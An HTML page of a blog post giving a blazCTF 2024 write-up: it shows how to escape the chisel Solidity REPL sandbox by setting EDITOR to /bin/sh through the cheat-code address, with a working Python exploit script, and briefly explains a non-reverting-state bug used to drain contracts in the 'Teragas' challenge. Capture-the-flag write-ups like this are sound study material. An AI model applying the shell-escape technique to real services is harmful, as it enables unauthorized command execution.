<!DOCTYPE html><html lang="kr" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)" /><meta property="og:locale" content="kr" /><meta name="description" content="blazCTF writeup" /><meta property="og:description" content="blazCTF writeup" /><link rel="canonical" href="http://blog.solidity.kr/posts/(ctf)-2024-blazCTF/" /><meta property="og:url" content="http://blog.solidity.kr/posts/(ctf)-2024-blazCTF/" /><meta property="og:site_name" content="snwo" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-09-27T05:02:13+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)" /><meta name="twitter:site" content="@snwo_kr" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"blazCTF writeup","url":"http://blog.solidity.kr/posts/(ctf)-2024-blazCTF/","@type":"BlogPosting","headline":"(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)","dateModified":"2024-09-27T12:35:28+09:00","datePublished":"2024-09-27T05:02:13+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.solidity.kr/posts/(ctf)-2024-blazCTF/"},"@context":"https://schema.org"}</script><title>(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas) | snwo</title><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://media.discordapp.net/attachments/952583628351746111/1366448241180409956/ralph.png?ex=68f9ac58&is=68f85ad8&hm=fa5cd570119d286902631feb85f361030c6a4f7c3eb252f258530ed92ba7ba4b&=&format=webp&quality=lossless&width=2488&height=2168" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">snwo</a></div><div class="site-subtitle font-italic">Interested in REV,WEB3,PWN</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/snwox" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/snwo_kr" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/snwo_kr">snwo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2024-09-27 05:02:13 +0900" data-toggle="tooltip" data-placement="bottom" title="Fri, Sep 27, 2024, 5:02 AM +0900" >Sep 27, 2024</em> </span> <span> Updated <em class="timeago" date="2024-09-27 12:35:28 +0900 " data-toggle="tooltip" data-placement="bottom" title="Fri, Sep 27, 2024, 12:35 PM +0900" >Sep 27, 2024</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1032 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><p>I played blaz CTF as <a href="https://x.com/Web3Kimchi">KimchiPremium</a>, had a lot of fun with the awesome kimchi hackers</p><h2 id="chisel-as-a-service">Chisel as a Service<a href="#chisel-as-a-service" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><blockquote><p>Chisel as a Service Mina just develops a highly robust Solidity sandbox!</p><p>Connect to Challenge: nc chisel-as-a-service.chal.ctf.so 1337 Your Ticket: 2b88a986-595d-45b0-9a24-2aa11a6c5c6d</p><p>Handouts</p><p>/* Author: minaminao */</p><p># Solidity,Sandbox / 25 solves / 371 pts</p></blockquote><p>The server runs <code class="language-plaintext highlighter-rouge">chisel</code> with the <code class="language-plaintext highlighter-rouge">--no-vm</code> option, and the -e (or -exec) keyword is disabled. The flag‚Äôs filename is random, so we need to get a shell.‚Äù</p><h3 id="chisel-commands">chisel commands<a href="#chisel-commands" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>No solidity versions installed! Installing solidity version 0.8.19...
Welcome to Chisel! Type `!help` to show available commands.
‚öíÔ∏è Chisel help
=============
General
    !help | !h - Display all commands
    !quit | !q - Quit Chisel
    !exec &lt;command&gt; [args] | !e &lt;command&gt; [args] - Execute a shell command and print the output

Session
    !clear | !c - Clear current session source
    !source | !so - Display the source code of the current session
    !save [id] | !s [id] - Save the current session to cache
    !load &lt;id&gt; | !l &lt;id&gt; - Load a previous session ID from cache
    !list | !ls - List all cached sessions
    !clearcache | !cc - Clear the chisel cache of all stored sessions
    !export | !ex - Export the current session source to a script file
    !fetch &lt;addr&gt; &lt;name&gt; | !fe &lt;addr&gt; &lt;name&gt; - Fetch the interface of a verified contract on Etherscan
    !edit - Open the current session in an editor

Environment
    !fork &lt;url&gt; | !f &lt;url&gt; - Fork an RPC for the current session. Supply 0 arguments to return to a local network
    !traces | !t - Enable / disable traces for the current session
    !calldata [data] | !cd [data] - Set calldata (`msg.data`) for the current session (appended after function selector). Clears it if no argument provided.

Debug
    !memdump | !md - Dump the raw memory of the current state
    !stackdump | !sd - Dump the raw stack of the current state
    !rawstack &lt;var&gt; | !rs &lt;var&gt; - Display the raw value of a variable's stack allocation. For variables that are &gt; 32 bytes in length, this will display their memory pointer.
</pre></table></code></div></div><p>To execute shell commands, we need to find a command that uses <code class="language-plaintext highlighter-rouge">process::Command</code>. Not only the <code class="language-plaintext highlighter-rouge">exec</code> command, but also the <code class="language-plaintext highlighter-rouge">edit</code> command uses Command to open the editor.</p><div class="language-rust highlighter-rouge"><div class="code-header"> <span label-text="Rust"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nn">ChiselCommand</span><span class="p">::</span><span class="n">Edit</span> <span class="k">=&gt;</span> <span class="p">{</span>
    <span class="c1">// create a temp file with the content of the run code</span>
    <span class="k">let</span> <span class="k">mut</span> <span class="n">temp_file_path</span> <span class="o">=</span> <span class="nn">std</span><span class="p">::</span><span class="nn">env</span><span class="p">::</span><span class="nf">temp_dir</span><span class="p">();</span>
    <span class="n">temp_file_path</span><span class="nf">.push</span><span class="p">(</span><span class="s">"chisel-tmp.sol"</span><span class="p">);</span>
    <span class="k">let</span> <span class="n">result</span> <span class="o">=</span> <span class="nn">std</span><span class="p">::</span><span class="nn">fs</span><span class="p">::</span><span class="nn">File</span><span class="p">::</span><span class="nf">create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">temp_file_path</span><span class="p">)</span>
        <span class="nf">.map</span><span class="p">(|</span><span class="k">mut</span> <span class="n">file</span><span class="p">|</span> <span class="n">file</span><span class="nf">.write_all</span><span class="p">(</span><span class="k">self</span><span class="nf">.source</span><span class="p">()</span><span class="py">.run_code</span><span class="nf">.as_bytes</span><span class="p">()));</span>
    <span class="k">if</span> <span class="k">let</span> <span class="nf">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">=</span> <span class="n">result</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nn">DispatchResult</span><span class="p">::</span><span class="nf">CommandFailed</span><span class="p">(</span><span class="nd">format!</span><span class="p">(</span>
            <span class="s">"Could not write to a temporary file: {e}"</span>
        <span class="p">))</span>
    <span class="p">}</span>

    <span class="c1">// open the temp file with the editor</span>
    <span class="k">let</span> <span class="n">editor</span> <span class="o">=</span> <span class="nn">std</span><span class="p">::</span><span class="nn">env</span><span class="p">::</span><span class="nf">var</span><span class="p">(</span><span class="s">"EDITOR"</span><span class="p">)</span><span class="nf">.unwrap_or_else</span><span class="p">(|</span><span class="n">_</span><span class="p">|</span> <span class="s">"vim"</span><span class="nf">.to_string</span><span class="p">());</span>
    <span class="k">let</span> <span class="k">mut</span> <span class="n">cmd</span> <span class="o">=</span> <span class="nn">Command</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">editor</span><span class="p">);</span>
    <span class="n">cmd</span><span class="nf">.arg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">temp_file_path</span><span class="p">);</span>

    <span class="k">match</span> <span class="n">cmd</span><span class="nf">.status</span><span class="p">()</span> <span class="p">{</span>
<span class="o">...</span>
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">edit</code> command, it saves the currently running code to <code class="language-plaintext highlighter-rouge">/tmp/chisel-tmp.sol</code> and then executes the editor with the file as an argument</p><p>With the <a href="https://book.getfoundry.sh/cheatcodes/set-env">setEnv</a> function in the Vm cheat code, we can set the <code class="language-plaintext highlighter-rouge">EDITOR</code> environment variable to <code class="language-plaintext highlighter-rouge">/bin/sh</code> and execute the running code as a shell script. However, the <code class="language-plaintext highlighter-rouge">--no-vm </code>flag is set. What exactly does this flag do?</p><h3 id="no-vm-flag">‚Äìno-vm flag<a href="#no-vm-flag" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><div class="language-rust highlighter-rouge"><div class="code-header"> <span label-text="Rust"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> <span class="k">pub</span> <span class="k">fn</span> <span class="nf">to_repl_source</span><span class="p">(</span><span class="o">&amp;</span><span class="k">self</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="nb">String</span> <span class="p">{</span>
    <span class="k">let</span> <span class="n">Version</span> <span class="p">{</span> <span class="n">major</span><span class="p">,</span> <span class="n">minor</span><span class="p">,</span> <span class="n">patch</span><span class="p">,</span> <span class="o">..</span> <span class="p">}</span> <span class="o">=</span> <span class="k">self</span><span class="py">.solc.version</span><span class="p">;</span>
    <span class="k">let</span> <span class="k">Self</span> <span class="p">{</span> <span class="n">contract_name</span><span class="p">,</span> <span class="n">global_code</span><span class="p">,</span> <span class="n">top_level_code</span><span class="p">,</span> <span class="n">run_code</span><span class="p">,</span> <span class="n">config</span><span class="p">,</span> <span class="o">..</span> <span class="p">}</span> <span class="o">=</span> <span class="k">self</span><span class="p">;</span>

    <span class="k">let</span> <span class="p">(</span><span class="n">vm_import</span><span class="p">,</span> <span class="n">vm_constant</span><span class="p">)</span> <span class="o">=</span> <span class="k">if</span> <span class="o">!</span><span class="n">config</span><span class="py">.no_vm</span> <span class="p">{</span>
        <span class="p">(</span>
            <span class="s">"import {Vm} from </span><span class="se">\"</span><span class="s">forge-std/Vm.sol</span><span class="se">\"</span><span class="s">;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
            <span class="s">"Vm internal constant vm = Vm(address(uint160(uint256(keccak256(</span><span class="se">\"</span><span class="s">hevm cheat code</span><span class="se">\"</span><span class="s">)))));</span><span class="se">\n</span><span class="s">"</span>
        <span class="p">)</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="p">(</span><span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
    <span class="p">};</span>
</pre></table></code></div></div><p>In the chisel code, when the <code class="language-plaintext highlighter-rouge">--no-vm</code> flag is set, it doesn‚Äôt import the <code class="language-plaintext highlighter-rouge">Vm</code> contract or set the <code class="language-plaintext highlighter-rouge">vm</code> constant. That‚Äôs all. We can still call the cheat codes in the Vm contract using the address <code class="language-plaintext highlighter-rouge">address(uint160(uint256(keccak256("hevm cheat code"))))</code>.</p><p>By setting the <code class="language-plaintext highlighter-rouge">EDITOR</code> environment variable to <code class="language-plaintext highlighter-rouge">/bin/sh</code>, we can execute the contents of the running code as a shell script. However, the running code needs to be valid Solidity. To work around this, we can simply add a comment with <code class="language-plaintext highlighter-rouge">;</code> and run cat flag, like <code class="language-plaintext highlighter-rouge">//; cat /flag-*.</code></p><h3 id="exploit">exploit<a href="#exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://snwo.kr:3000/"</span>

<span class="n">code</span> <span class="o">=</span> <span class="s">"""
//;cat /flag-*
address hevm = address(uint160(uint256(keccak256("hevm cheat code"))));
interface VM { function setEnv(string calldata key, string calldata value) external; }
VM vm = VM(hevm);
vm.setEnv("EDITOR", "/bin/sh");
!edit
"""</span>
<span class="n">uuid</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"run"</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">"code"</span><span class="p">:</span><span class="n">code</span><span class="p">}).</span><span class="n">json</span><span class="p">()[</span><span class="s">'uuid'</span><span class="p">]</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">"out/"</span><span class="o">+</span><span class="n">uuid</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="teragas">Teragas<a href="#teragas" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><blockquote><p>Teragas After getting exploited by REVMC bug, Tony started to hate Paradigm. Seeing Paradigm invested in so many parallel EVM chains and built Reth, Tony decided to build an even faster chain to compete with them.</p><p>This is a King Of the Hill challenge. The more ETHs you steal, the more points you would get. Submit your exploit at teragas.ctf.so ‚Ä¶ /* Author: shoucccc */</p><p># KoH,EVM / 6 solves / 2500 pts</p><p>Team KimchiPremium: <code class="language-plaintext highlighter-rouge">1986007ETH</code> Team DPRK Workers In Your Company: 1796703ETH Team Wut is Ciallo: 1656267ETH Team Amber Labs: 1532119ETH Team offside_labs_interns: 1478952ETH Team DeFiHackLabs: 277542ETH Team shou: 0ETH</p></blockquote><p>Just a brief writeup. we earned a total of <code class="language-plaintext highlighter-rouge">19,986,007</code> ETH. There was a bug that each state-related opcodes do not recover the state when it reverts. So we can leverage this to bypass check balance or smth.</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">join</span><span class="p">(</span><span class="kt">address</span> <span class="n">usr</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">wad</span><span class="p">)</span> <span class="k">external</span> <span class="n">note</span> <span class="p">{</span>
        <span class="n">vat</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">usr</span><span class="p">,</span> <span class="n">mul</span><span class="p">(</span><span class="n">ONE</span><span class="p">,</span> <span class="n">wad</span><span class="p">));</span>
        <span class="n">dai</span><span class="p">.</span><span class="n">burn</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">wad</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">exit</span><span class="p">(</span><span class="kt">address</span> <span class="n">usr</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">wad</span><span class="p">)</span> <span class="k">external</span> <span class="n">note</span> <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">live</span> <span class="o">==</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"DaiJoin/not-live"</span><span class="p">);</span>
        <span class="n">vat</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">mul</span><span class="p">(</span><span class="n">ONE</span><span class="p">,</span> <span class="n">wad</span><span class="p">));</span>
        <span class="n">dai</span><span class="p">.</span><span class="n">mint</span><span class="p">(</span><span class="n">usr</span><span class="p">,</span> <span class="n">wad</span><span class="p">);</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>For example, in the MakerDAO contract, tokens are minted first and then the balance is checked. Since the sstore opcode doesn‚Äôt revert the state when the transaction reverts, we were able to keep the minted tokens.</p><p>We drained all WETH pairs of top TVL swaps, as well as flash loan contracts, bridges, and smth‚Ä¶ It was a lot of fun exploring the Ethereum chain to drain the contracts ü´†</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web3/'>WEB3</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/web3/" class="post-tag no-text-decoration" >web3</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas) - snwo&url=http://blog.solidity.kr/posts/(ctf)-2024-blazCTF/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas) - snwo&u=http://blog.solidity.kr/posts/(ctf)-2024-blazCTF/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas) - snwo&url=http://blog.solidity.kr/posts/(ctf)-2024-blazCTF/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/(ctf)-sonic-jailbreak-hackathon/">(CTF) Sonic Jailbreak hackathon writeup</a><li><a href="/posts/(ctf)-bi0s-ctf-2025/">(CTF) bi0s CTF 2025 writeup (blockchains)</a><li><a href="/posts/(ctf)-2024-eth-escape-ctf/">(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)</a><li><a href="/posts/(ctf)-2024-blazCTF/">(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)</a><li><a href="/posts/(ctf)-2024-SekaiCTF/">(CTF) SekaiCTF 2024 writeup (ZOO)</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/(ctf)-2024-realworldctf/"><div class="card-body"> <em class="timeago small" date="2024-01-30 17:02:13 +0900" >Jan 30, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) realworld CTF 2024 writeup (SafeBridge)</h3><div class="text-muted small"><p> web3 newbie‚Äôs solver for SafeBridge in rwctf 2024 Objective Drain the BRIDGE (L1ERC20Bridge) of its WETH balance. Setup The challenge setup is using the challenge.py file, with relayer.py also ...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2024-justCTF/"><div class="card-body"> <em class="timeago small" date="2024-06-16 17:02:13 +0900" >Jun 16, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) justCTF 2024 writeup (Blockchains)</h3><div class="text-muted small"><p> It was first time for me to solve move based challenge. Solved 3 blockchain challenges, World of Ottercraft, The Otter Scrolls, Dark BrOTTERhood ( all move based challenge ) The Otter Scrolls Al...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2024-SekaiCTF/"><div class="card-body"> <em class="timeago small" date="2024-08-27 05:02:13 +0900" >Aug 27, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) SekaiCTF 2024 writeup (ZOO)</h3><div class="text-muted small"><p> I made solidity assembly challenge in sekai ctf 2024. ended up with 13 solves. you can check the detail here ZOO welcome to assembly zoo There are two functions, fallback and commit (intern...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/(ctf)-2024-SekaiCTF/" class="btn btn-outline-primary" prompt="Older"><p>(CTF) SekaiCTF 2024 writeup (ZOO)</p></a> <a href="/posts/(ctf)-2024-eth-escape-ctf/" class="btn btn-outline-primary" prompt="Newer"><p>(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2025 <a href="https://twitter.com/snwo_kr">snwo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG ‚Ä∫ <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script 